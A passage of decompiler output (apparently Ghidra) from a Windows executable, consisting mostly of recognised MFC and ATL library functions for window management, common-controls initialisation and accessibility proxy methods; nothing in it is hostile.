      iVar2 = _xMonitorFromWindow_8(pHVar5,1);
      _xGetMonitorInfo_8(iVar2,puVar6);
      CopyRect(&local_2c,&local_50);
      CopyRect(&local_1c,&local_50);
    }
    else {
      GetWindowRect(pHVar5,&local_2c);
      puVar6 = local_64;
      iVar2 = _xMonitorFromWindow_8(pHVar5,2);
      _xGetMonitorInfo_8(iVar2,puVar6);
      CopyRect(&local_1c,&local_50);
    }
  }
  else {
    pHVar3 = GetParent(*(HWND *)(this + 0x20));
    GetClientRect(pHVar3,&local_1c);
    GetClientRect(pHVar5,&local_2c);
    MapWindowPoints(pHVar5,pHVar3,(LPPOINT)&local_2c,2);
  }
  iVar2 = (local_2c.left + local_2c.right) / 2 - (local_3c.right - local_3c.left) / 2;
  iVar4 = (local_2c.top + local_2c.bottom) / 2 - (local_3c.bottom - local_3c.top) / 2;
  if (local_1c.right < (local_3c.right - local_3c.left) + iVar2) {
    iVar2 = (local_3c.left - local_3c.right) + local_1c.right;
  }
  if (iVar2 < local_1c.left) {
    iVar2 = local_1c.left;
  }
  if (local_1c.bottom < (local_3c.bottom - local_3c.top) + iVar4) {
    iVar4 = (local_3c.top - local_3c.bottom) + local_1c.bottom;
  }
  if (iVar4 < local_1c.top) {
    iVar4 = local_1c.top;
  }
  SetWindowPos(local_c,(CWnd *)0x0,iVar2,iVar4,-1,-1,0x15);
  return;
}



// Library Function - Single Match
//  public: virtual void __thiscall CWnd::EndModalLoop(int)
// 
// Library: Visual Studio 2008 Release

void __thiscall CWnd::EndModalLoop(CWnd *this,int param_1)

{
  *(int *)(this + 0x44) = param_1;
  if ((*(uint *)(this + 0x3c) & 0x10) != 0) {
    *(uint *)(this + 0x3c) = *(uint *)(this + 0x3c) & 0xffffffef;
    PostMessageW(*(HWND *)(this + 0x20),0,0,0);
  }
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  public: struct HINSTANCE__ * __thiscall CDllIsolationWrapperBase::GetModuleHandleA(void)
//  public: struct HINSTANCE__ * __thiscall CDllIsolationWrapperBase::GetModuleHandleW(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

HMODULE FID_conflict_GetModuleHandleA(LPCSTR lpModuleName)

{
  HMODULE pHVar1;
  int in_ECX;
  
  if (*(int *)(in_ECX + 4) == 0) {
    pHVar1 = GetModuleHandleW(*(LPCWSTR *)(in_ECX + 0xc));
    *(HMODULE *)(in_ECX + 4) = pHVar1;
    if (pHVar1 == (HMODULE)0x0) {
      pHVar1 = LoadLibraryW(*(LPCWSTR *)(in_ECX + 0xc));
      *(HMODULE *)(in_ECX + 4) = pHVar1;
      *(bool *)(in_ECX + 8) = pHVar1 != (HMODULE)0x0;
    }
  }
  return *(HMODULE *)(in_ECX + 4);
}



// Library Function - Single Match
//  public: struct CComCtlWrapper::InitCommonControls_Type __thiscall
// CComCtlWrapper::GetProcAddress_InitCommonControls(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall
CComCtlWrapper::GetProcAddress_InitCommonControls(CComCtlWrapper *this,undefined4 *param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  char *lpProcName;
  
  if (*(int *)(this + 0x10) == 0) {
    lpProcName = "InitCommonControls";
    hModule = FID_conflict_GetModuleHandleA("InitCommonControls");
    pFVar1 = GetProcAddress(hModule,lpProcName);
    *(FARPROC *)(this + 0x10) = pFVar1;
  }
  *param_1 = *(undefined4 *)(this + 0x10);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: void __thiscall CComCtlWrapper::_InitCommonControls(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CComCtlWrapper::_InitCommonControls(CComCtlWrapper *this)

{
  code *pcVar1;
  AFX_MODULE_STATE *pAVar2;
  ulong *puVar3;
  undefined local_28 [4];
  eActCtxResult local_24;
  ulong local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_0042fc28;
  uStack_c = 0x40fc80;
  local_20[0] = 0;
  puVar3 = local_20;
  pAVar2 = AfxGetModuleState();
  local_24 = AfxActivateActCtxWrapper(*(void **)(pAVar2 + 0x80),puVar3);
  if (local_24 != 0) {
    local_8 = (undefined *)0x0;
    GetProcAddress_InitCommonControls(this,local_28);
    pcVar1 = *(code **)(this + 0x10);
    if (pcVar1 == (code *)0x0) {
      AfxThrowNotSupportedException();
    }
    (*pcVar1)();
    local_8 = (undefined *)0xfffffffe;
    FUN_0040fcd7();
  }
  return;
}



void FUN_0040fcd7(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x20) != 2) {
    FUN_0040ad54();
  }
  return;
}



// Library Function - Single Match
//  public: struct CComCtlWrapper::InitCommonControlsEx_Type __thiscall
// CComCtlWrapper::GetProcAddress_InitCommonControlsEx(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall
CComCtlWrapper::GetProcAddress_InitCommonControlsEx(CComCtlWrapper *this,undefined4 *param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  char *lpProcName;
  
  if (*(int *)(this + 0x14) == 0) {
    lpProcName = "InitCommonControlsEx";
    hModule = FID_conflict_GetModuleHandleA("InitCommonControlsEx");
    pFVar1 = GetProcAddress(hModule,lpProcName);
    *(FARPROC *)(this + 0x14) = pFVar1;
  }
  *param_1 = *(undefined4 *)(this + 0x14);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: int __thiscall CComCtlWrapper::_InitCommonControlsEx(struct tagINITCOMMONCONTROLSEX *)
// 
// Library: Visual Studio 2008 Release

int __thiscall
CComCtlWrapper::_InitCommonControlsEx(CComCtlWrapper *this,tagINITCOMMONCONTROLSEX *param_1)

{
  AFX_MODULE_STATE *pAVar1;
  code *pcVar2;
  ulong *puVar3;
  undefined local_2c [4];
  eActCtxResult local_28;
  ulong local_24;
  int local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_0042fc48;
  uStack_c = 0x40fd23;
  local_24 = 0;
  puVar3 = &local_24;
  pAVar1 = AfxGetModuleState();
  local_28 = AfxActivateActCtxWrapper(*(void **)(pAVar1 + 0x80),puVar3);
  local_20 = 0;
  if (local_28 == 0) {
    local_20 = 0;
  }
  else {
    local_8 = (undefined *)0x0;
    GetProcAddress_InitCommonControlsEx(this,local_2c);
    pcVar2 = *(code **)(this + 0x14);
    if (pcVar2 == (code *)0x0) {
      AfxThrowNotSupportedException();
    }
    local_20 = (*pcVar2)(param_1);
    local_8 = (undefined *)0xfffffffe;
    FUN_0040fd8c();
  }
  return local_20;
}



void FUN_0040fd8c(void)

{
  DWORD dwErrCode;
  int unaff_EBP;
  bool bVar1;
  
  if (*(int *)(unaff_EBP + -0x24) != 2) {
    bVar1 = *(int *)(unaff_EBP + -0x1c) != 0;
    if (bVar1) {
      dwErrCode = 0;
    }
    else {
      dwErrCode = GetLastError();
    }
    FUN_0040ad54();
    if (!bVar1) {
      SetLastError(dwErrCode);
    }
  }
  return;
}



// Library Function - Single Match
//  int __stdcall AfxInitCommonControlsEx(struct tagINITCOMMONCONTROLSEX *)
// 
// Library: Visual Studio 2008 Release

int AfxInitCommonControlsEx(tagINITCOMMONCONTROLSEX *param_1)

{
  AFX_MODULE_STATE *pAVar1;
  int iVar2;
  
  pAVar1 = AfxGetModuleState();
  iVar2 = CComCtlWrapper::_InitCommonControlsEx(**(CComCtlWrapper ***)(pAVar1 + 0x78),param_1);
  return iVar2;
}



void __fastcall FUN_0040fddd(int *param_1)

{
  if (*param_1 != 0x7fffffff) {
    AfxUnlockGlobals(*param_1);
    *param_1 = 0x7fffffff;
  }
  return;
}



// Library Function - Single Match
//  protected: static struct tagMSG const * __stdcall CWnd::GetCurrentMessage(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

tagMSG * CWnd::GetCurrentMessage(void)

{
  CNoTrackObject *pCVar1;
  LONG LVar2;
  DWORD DVar3;
  
  pCVar1 = CThreadLocalObject::GetData
                     ((CThreadLocalObject *)&DAT_004342f0,(_func_CNoTrackObject_ptr *)&LAB_0040a5ef)
  ;
  if (pCVar1 == (CNoTrackObject *)0x0) {
    AfxThrowNotSupportedException();
  }
  LVar2 = GetMessageTime();
  *(LONG *)(pCVar1 + 0x68) = LVar2;
  DVar3 = GetMessagePos();
  *(int *)(pCVar1 + 0x70) = (int)(short)(DVar3 >> 0x10);
  *(int *)(pCVar1 + 0x6c) = (int)(short)DVar3;
  return (tagMSG *)(pCVar1 + 0x58);
}



// Library Function - Single Match
//  protected: long __thiscall CWnd::Default(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __thiscall CWnd::Default(CWnd *this)

{
  CNoTrackObject *pCVar1;
  long lVar2;
  
  pCVar1 = CThreadLocalObject::GetData
                     ((CThreadLocalObject *)&DAT_004342f0,(_func_CNoTrackObject_ptr *)&LAB_0040a5ef)
  ;
  if (pCVar1 == (CNoTrackObject *)0x0) {
    AfxThrowNotSupportedException();
  }
  lVar2 = (**(code **)(*(int *)this + 0x118))
                    (*(undefined4 *)(pCVar1 + 0x5c),*(undefined4 *)(pCVar1 + 0x60),
                     *(undefined4 *)(pCVar1 + 100));
  return lVar2;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  class CHandleMap * __stdcall afxMapHWND(int)
// 
// Library: Visual Studio 2008 Release

CHandleMap * afxMapHWND(int param_1)

{
  AFX_MODULE_THREAD_STATE *pAVar1;
  _func_int_uint *p_Var2;
  CHandleMap *this;
  undefined4 uVar3;
  
  pAVar1 = AfxGetModuleThreadState();
  if ((*(int *)(pAVar1 + 0x14) == 0) && (param_1 != 0)) {
    p_Var2 = AfxSetNewHandler(AfxCriticalNewHandler);
    this = (CHandleMap *)operator_new(0x60);
    if (this == (CHandleMap *)0x0) {
      uVar3 = 0;
    }
    else {
      uVar3 = CHandleMap::CHandleMap
                        (this,(CRuntimeClass *)&PTR_DAT_00429ad8,
                         (_func_void_CObject_ptr *)&LAB_0040fbea,FUN_00413080,0x20,1);
    }
    *(undefined4 *)(pAVar1 + 0x14) = uVar3;
    AfxSetNewHandler(p_Var2);
  }
  return *(CHandleMap **)(pAVar1 + 0x14);
}



// Library Function - Single Match
//  public: static class CWnd * __stdcall CWnd::FromHandle(struct HWND__ *)
// 
// Library: Visual Studio 2008 Release

CWnd * CWnd::FromHandle(HWND__ *param_1)

{
  CHandleMap *this;
  CObject *this_00;
  
  this = afxMapHWND(1);
  this_00 = CHandleMap::FromHandle(this,param_1);
  AttachControlSite((CWnd *)this_00,this);
  return (CWnd *)this_00;
}



// Library Function - Single Match
//  public: static class CWnd * __stdcall CWnd::FromHandlePermanent(struct HWND__ *)
// 
// Library: Visual Studio 2008 Release

CWnd * CWnd::FromHandlePermanent(HWND__ *param_1)

{
  CHandleMap *pCVar1;
  CWnd *pCVar2;
  
  pCVar1 = afxMapHWND(0);
  if (pCVar1 != (CHandleMap *)0x0) {
    pCVar2 = (CWnd *)CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(pCVar1 + 0x1c),param_1);
    return pCVar2;
  }
  return (CWnd *)0x0;
}



// Library Function - Single Match
//  public: int __thiscall CWnd::Attach(struct HWND__ *)
// 
// Library: Visual Studio 2008 Release

int __thiscall CWnd::Attach(CWnd *this,HWND__ *param_1)

{
  CHandleMap *this_00;
  
  if (param_1 != (HWND__ *)0x0) {
    this_00 = afxMapHWND(1);
    *(HWND__ **)(this + 0x20) = param_1;
    CHandleMap::SetPermanent(this_00,param_1,(CObject *)this);
    AttachControlSite(this,this_00);
  }
  return (uint)(param_1 != (HWND__ *)0x0);
}



// Library Function - Single Match
//  public: struct HWND__ * __thiscall CWnd::Detach(void)
// 
// Library: Visual Studio 2008 Release

HWND__ * __thiscall CWnd::Detach(CWnd *this)

{
  HWND__ *pHVar1;
  CHandleMap *pCVar2;
  
  pHVar1 = *(HWND__ **)(this + 0x20);
  if (pHVar1 != (HWND__ *)0x0) {
    pCVar2 = afxMapHWND(0);
    if (pCVar2 != (CHandleMap *)0x0) {
      CMapPtrToPtr::RemoveKey((CMapPtrToPtr *)(pCVar2 + 0x1c),*(void **)(this + 0x20));
    }
    *(undefined4 *)(this + 0x20) = 0;
  }
  *(undefined4 *)(this + 0x50) = 0;
  return pHVar1;
}



// Library Function - Single Match
//  int __stdcall AfxUnhookWindowCreate(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int AfxUnhookWindowCreate(void)

{
  CNoTrackObject *pCVar1;
  AFX_MODULE_STATE *pAVar2;
  
  pCVar1 = CThreadLocalObject::GetData
                     ((CThreadLocalObject *)&DAT_004342f0,(_func_CNoTrackObject_ptr *)&LAB_0040a5ef)
  ;
  if (pCVar1 == (CNoTrackObject *)0x0) {
    AfxThrowNotSupportedException();
  }
  pAVar2 = AfxGetModuleState();
  if ((pAVar2[0x14] != (AFX_MODULE_STATE)0x0) && (*(HHOOK *)(pCVar1 + 0x28) != (HHOOK)0x0)) {
    UnhookWindowsHookEx(*(HHOOK *)(pCVar1 + 0x28));
    *(undefined4 *)(pCVar1 + 0x28) = 0;
  }
  if (*(int *)(pCVar1 + 0x14) != 0) {
    *(undefined4 *)(pCVar1 + 0x14) = 0;
    return 0;
  }
  return 1;
}



// Library Function - Single Match
//  protected: void __thiscall CWnd::OnNcDestroy(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CWnd::OnNcDestroy(CWnd *this)

{
  int iVar1;
  AFX_MODULE_STATE *pAVar2;
  int iVar3;
  AFX_MODULE_THREAD_STATE *pAVar4;
  LONG LVar5;
  LONG LVar6;
  int *piVar7;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  
  iVar1 = FUN_0040c560();
  if (iVar1 == 0) goto LAB_00410056;
  if (*(CWnd **)(iVar1 + 0x20) == this) {
    pAVar2 = AfxGetModuleState();
    if (pAVar2[0x14] == (AFX_MODULE_STATE)0x0) {
      pAVar2 = AfxGetModuleState();
      if (iVar1 == *(int *)(pAVar2 + 4)) {
        iVar3 = AfxOleCanExitApp();
        if (iVar3 == 0) goto LAB_0041004b;
      }
      AfxPostQuitMessage(0);
    }
LAB_0041004b:
    *(undefined4 *)(iVar1 + 0x20) = 0;
  }
  if (*(CWnd **)(iVar1 + 0x24) == this) {
    *(undefined4 *)(iVar1 + 0x24) = 0;
  }
LAB_00410056:
  if (*(int **)(this + 0x48) != (int *)0x0) {
    (**(code **)(**(int **)(this + 0x48) + 0x50))();
    *(undefined4 *)(this + 0x48) = 0;
  }
  if (*(int **)(this + 0x4c) != (int *)0x0) {
    (**(code **)(**(int **)(this + 0x4c) + 4))(1);
  }
  *(undefined4 *)(this + 0x4c) = 0;
  if (((byte)this[0x3c] & 1) != 0) {
    pAVar4 = AfxGetModuleThreadState();
    iVar1 = *(int *)(pAVar4 + 0x3c);
    if ((iVar1 != 0) && (*(int *)(iVar1 + 0x20) != 0)) {
      _memset(&local_34,0,0x30);
      local_2c = *(undefined4 *)(this + 0x20);
      local_34 = 0x2c;
      local_30 = 1;
      local_28 = local_2c;
      SendMessageW(*(HWND *)(iVar1 + 0x20),0x433,0,(LPARAM)&local_34);
    }
  }
  LVar5 = GetWindowLongW(*(HWND *)(this + 0x20),-4);
  Default(this);
  LVar6 = GetWindowLongW(*(HWND *)(this + 0x20),-4);
  if (LVar6 == LVar5) {
    piVar7 = (int *)(**(code **)(*(int *)this + 0xf8))();
    if (*piVar7 != 0) {
      SetWindowLongW(*(HWND *)(this + 0x20),-4,*piVar7);
    }
  }
  Detach(this);
  (**(code **)(*(int *)this + 0x11c))();
  return;
}



// Library Function - Single Match
//  public: virtual int __thiscall CWnd::DestroyWindow(void)
// 
// Library: Visual Studio 2008 Release

int __thiscall CWnd::DestroyWindow(CWnd *this)

{
  CHandleMap *pCVar1;
  int iVar2;
  
  iVar2 = 0;
  if (*(int *)(this + 0x20) == 0) {
    if (*(int *)(this + 0x50) == 0) {
      return 0;
    }
  }
  else {
    pCVar1 = afxMapHWND(0);
    if (pCVar1 == (CHandleMap *)0x0) {
      AfxThrowNotSupportedException();
    }
    CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(pCVar1 + 0x1c),*(void **)(this + 0x20));
  }
  if ((*(HWND *)(this + 0x20) != (HWND)0x0) || (*(int *)(this + 0x50) != 0)) {
    if (*(int *)(this + 0x50) == 0) {
      iVar2 = ::DestroyWindow(*(HWND *)(this + 0x20));
    }
    else {
      iVar2 = (**(code **)(**(int **)(this + 0x50) + 0x58))();
    }
  }
  return iVar2;
}



// Library Function - Single Match
//  protected: long __thiscall CWnd::OnNTCtlColor(unsigned int,long)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __thiscall CWnd::OnNTCtlColor(CWnd *this,uint param_1,long param_2)

{
  CNoTrackObject *pCVar1;
  long lVar2;
  long local_10;
  uint local_c;
  int local_8;
  
  local_c = param_1;
  local_10 = param_2;
  pCVar1 = CThreadLocalObject::GetData
                     ((CThreadLocalObject *)&DAT_004342f0,(_func_CNoTrackObject_ptr *)&LAB_0040a5ef)
  ;
  if (pCVar1 == (CNoTrackObject *)0x0) {
    AfxThrowNotSupportedException();
  }
  local_8 = *(int *)(pCVar1 + 0x5c) + -0x132;
  lVar2 = (**(code **)(*(int *)this + 0x110))(0x19,0,&local_10);
  return lVar2;
}



// Library Function - Single Match
//  public: static class CWnd * __stdcall CWnd::GetDescendantWindow(struct HWND__ *,int,int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

CWnd * CWnd::GetDescendantWindow(HWND__ *param_1,int param_2,int param_3)

{
  HWND hWnd;
  HWND pHVar1;
  CWnd *pCVar2;
  HWND__ *hWnd_00;
  
  hWnd = GetDlgItem(param_1,param_2);
  if (hWnd != (HWND)0x0) {
    pHVar1 = GetTopWindow(hWnd);
    if ((pHVar1 != (HWND)0x0) &&
       (pCVar2 = GetDescendantWindow(hWnd,param_2,param_3), pCVar2 != (CWnd *)0x0)) {
      return pCVar2;
    }
    if (param_3 == 0) {
      pCVar2 = FromHandle(hWnd);
      return pCVar2;
    }
    pCVar2 = FromHandlePermanent(hWnd);
    if (pCVar2 != (CWnd *)0x0) {
      return pCVar2;
    }
  }
  hWnd_00 = GetTopWindow(param_1);
  while( true ) {
    if (hWnd_00 == (HWND__ *)0x0) {
      return (CWnd *)0x0;
    }
    pCVar2 = GetDescendantWindow(hWnd_00,param_2,param_3);
    if (pCVar2 != (CWnd *)0x0) break;
    hWnd_00 = ::GetWindow(hWnd_00,2);
  }
  return pCVar2;
}



// Library Function - Single Match
//  public: int __thiscall CWnd::SendChildNotifyLastMsg(long *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __thiscall CWnd::SendChildNotifyLastMsg(CWnd *this,long *param_1)

{
  CNoTrackObject *pCVar1;
  int iVar2;
  
  pCVar1 = CThreadLocalObject::GetData
                     ((CThreadLocalObject *)&DAT_004342f0,(_func_CNoTrackObject_ptr *)&LAB_0040a5ef)
  ;
  if (pCVar1 == (CNoTrackObject *)0x0) {
    AfxThrowNotSupportedException();
  }
  iVar2 = (**(code **)(*(int *)this + 0x120))
                    (*(undefined4 *)(pCVar1 + 0x5c),*(undefined4 *)(pCVar1 + 0x60),
                     *(undefined4 *)(pCVar1 + 100),param_1);
  return iVar2;
}



// Library Function - Single Match
//  protected: long __thiscall CWnd::OnGetObject(unsigned int,long)
// 
// Library: Visual Studio 2008 Release

long __thiscall CWnd::OnGetObject(CWnd *this,uint param_1,long param_2)

{
  long lVar1;
  int iVar2;
  CWnd *local_8;
  
  local_8 = this;
  if (this[0x24] != (CWnd)0x0) {
    local_8 = (CWnd *)0x0;
    iVar2 = (**(code **)(*(int *)this + 0xec))(param_1,param_2,&local_8);
    if (-1 < iVar2) {
      return (long)local_8;
    }
  }
  lVar1 = Default(this);
  return lVar1;
}



// Library Function - Multiple Matches With Different Base Names
//  protected: void __thiscall CWnd::OnHScroll(unsigned int,unsigned int,class CScrollBar *)
//  protected: void __thiscall CWnd::OnVScroll(unsigned int,unsigned int,class CScrollBar *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall
FID_conflict_OnHScroll(void *this,undefined4 param_1,undefined4 param_2,CWnd *param_3)

{
  int iVar1;
  
  if ((param_3 != (CWnd *)0x0) &&
     (iVar1 = CWnd::SendChildNotifyLastMsg(param_3,(long *)0x0), iVar1 != 0)) {
    return;
  }
  CWnd::Default((CWnd *)this);
  return;
}



// Library Function - Single Match
//  protected: void __thiscall CWnd::OnEnterIdle(unsigned int,class CWnd *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall CWnd::OnEnterIdle(CWnd *this,uint param_1,CWnd *param_2)

{
  BOOL BVar1;
  MSG local_20;
  
  while( true ) {
    BVar1 = PeekMessageW(&local_20,(HWND)0x0,0x121,0x121,1);
    if (BVar1 == 0) break;
    DispatchMessageW(&local_20);
  }
  Default(this);
  return;
}



// Library Function - Single Match
//  protected: struct HBRUSH__ * __thiscall CWnd::OnCtlColor(class CDC *,class CWnd *,unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

HBRUSH__ * __thiscall CWnd::OnCtlColor(CWnd *this,CDC *param_1,CWnd *param_2,uint param_3)

{
  int iVar1;
  
  iVar1 = SendChildNotifyLastMsg(param_2,(long *)&param_2);
  if (iVar1 == 0) {
    param_2 = (CWnd *)Default(this);
  }
  return (HBRUSH__ *)param_2;
}



// Library Function - Single Match
//  long __stdcall _AfxInitCommonControls(struct tagINITCOMMONCONTROLSEX *,long)
// 
// Library: Visual Studio 2008 Release

long _AfxInitCommonControls(tagINITCOMMONCONTROLSEX *param_1,long param_2)

{
  AFX_MODULE_STATE *pAVar1;
  int *piVar2;
  int iVar3;
  long lVar4;
  undefined *puVar5;
  undefined local_8 [4];
  
  puVar5 = local_8;
  lVar4 = 0;
  pAVar1 = AfxGetModuleState();
  piVar2 = (int *)CComCtlWrapper::GetProcAddress_InitCommonControlsEx
                            (**(CComCtlWrapper ***)(pAVar1 + 0x78),puVar5);
  if (*piVar2 == 0) {
    if ((param_2 & 0x3fc0U) == param_2) {
      pAVar1 = AfxGetModuleState();
      CComCtlWrapper::_InitCommonControls(**(CComCtlWrapper ***)(pAVar1 + 0x78));
      lVar4 = 0x3fc0;
    }
  }
  else {
    iVar3 = AfxInitCommonControlsEx(param_1);
    if (iVar3 != 0) {
      lVar4 = param_2;
    }
  }
  return lVar4;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::get_accParent(struct IDispatch * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::get_accParent(IDispatch **param_1)

{
  long lVar1;
  int in_stack_00000008;
  
  if (param_1[2] == (IDispatch *)0x0) {
    lVar1 = -0x7ffefef8;
  }
  else if (in_stack_00000008 == 0) {
    lVar1 = -0x7fffbffd;
  }
  else {
    lVar1 = (**(code **)(*(int *)param_1[2] + 0x1c))(param_1[2]);
  }
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::get_accChildCount(long *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::get_accChildCount(long *param_1)

{
  long lVar1;
  int in_stack_00000008;
  
  if (param_1[2] == 0) {
    lVar1 = -0x7ffefef8;
  }
  else if (in_stack_00000008 == 0) {
    lVar1 = -0x7fffbffd;
  }
  else {
    lVar1 = (**(code **)(*(int *)param_1[2] + 0x20))((int *)param_1[2]);
  }
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::get_accChild(struct tagVARIANT,struct IDispatch * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4
ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::get_accChild
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          int param_6)

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = *(int **)(param_1 + 8);
  if (piVar1 == (int *)0x0) {
    uVar2 = 0x80010108;
  }
  else if (param_6 == 0) {
    uVar2 = 0x80004003;
  }
  else {
    uVar2 = (**(code **)(*piVar1 + 0x24))(piVar1,param_2,param_3,param_4,param_5,param_6);
  }
  return uVar2;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::get_accName(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4
ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::get_accName
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          int param_6)

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = *(int **)(param_1 + 8);
  if (piVar1 == (int *)0x0) {
    uVar2 = 0x80010108;
  }
  else if (param_6 == 0) {
    uVar2 = 0x80004003;
  }
  else {
    uVar2 = (**(code **)(*piVar1 + 0x28))(piVar1,param_2,param_3,param_4,param_5,param_6);
  }
  return uVar2;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::get_accValue(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4
ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::get_accValue
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          int param_6)

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = *(int **)(param_1 + 8);
  if (piVar1 == (int *)0x0) {
    uVar2 = 0x80010108;
  }
  else if (param_6 == 0) {
    uVar2 = 0x80004003;
  }
  else {
    uVar2 = (**(code **)(*piVar1 + 0x2c))(piVar1,param_2,param_3,param_4,param_5,param_6);
  }
  return uVar2;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::get_accDescription(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4
ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::get_accDescription
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          int param_6)

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = *(int **)(param_1 + 8);
  if (piVar1 == (int *)0x0) {
    uVar2 = 0x80010108;
  }
  else if (param_6 == 0) {
    uVar2 = 0x80004003;
  }
  else {
    uVar2 = (**(code **)(*piVar1 + 0x30))(piVar1,param_2,param_3,param_4,param_5,param_6);
  }
  return uVar2;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::get_accRole(struct tagVARIANT,struct tagVARIANT *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4
ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::get_accRole
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          int param_6)

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = *(int **)(param_1 + 8);
  if (piVar1 == (int *)0x0) {
    uVar2 = 0x80010108;
  }
  else if (param_6 == 0) {
    uVar2 = 0x80004003;
  }
  else {
    uVar2 = (**(code **)(*piVar1 + 0x34))(piVar1,param_2,param_3,param_4,param_5,param_6);
  }
  return uVar2;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::get_accState(struct tagVARIANT,struct tagVARIANT *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4
ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::get_accState
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          int param_6)

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = *(int **)(param_1 + 8);
  if (piVar1 == (int *)0x0) {
    uVar2 = 0x80010108;
  }
  else if (param_6 == 0) {
    uVar2 = 0x80004003;
  }
  else {
    uVar2 = (**(code **)(*piVar1 + 0x38))(piVar1,param_2,param_3,param_4,param_5,param_6);
  }
  return uVar2;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::get_accHelp(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4
ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::get_accHelp
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          int param_6)

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = *(int **)(param_1 + 8);
  if (piVar1 == (int *)0x0) {
    uVar2 = 0x80010108;
  }
  else if (param_6 == 0) {
    uVar2 = 0x80004003;
  }
  else {
    uVar2 = (**(code **)(*piVar1 + 0x3c))(piVar1,param_2,param_3,param_4,param_5,param_6);
  }
  return uVar2;
}



// Library Function - Single Match
